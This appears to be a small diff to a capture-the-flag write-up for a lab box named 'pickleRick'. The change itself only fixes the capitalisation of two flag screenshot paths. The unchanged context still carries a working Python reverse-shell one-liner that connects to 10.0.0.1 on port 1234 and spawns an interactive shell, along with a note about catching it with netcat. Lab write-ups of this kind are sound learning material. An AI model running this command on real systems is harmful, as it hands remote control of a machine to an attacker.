@@ -21,9 +21,9 @@ permalink: pickleRick
     >python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
  - listening via netcat will gain you access to the **BOX**
 ### 1st Flag:
-![user_flag](saharshtapi.github.io/images/PickleRick/1st.png)
+![user_flag](saharshtapi.github.io/images/pickleRick/1st.png)
 ### 2nd Flag:
-![user_flag](saharshtapi.github.io/images/PickleRick/2nd.png) 
+![user_flag](saharshtapi.github.io/images/pickleRick/2nd.png) 
 
 
 ## Privilege Escalation:
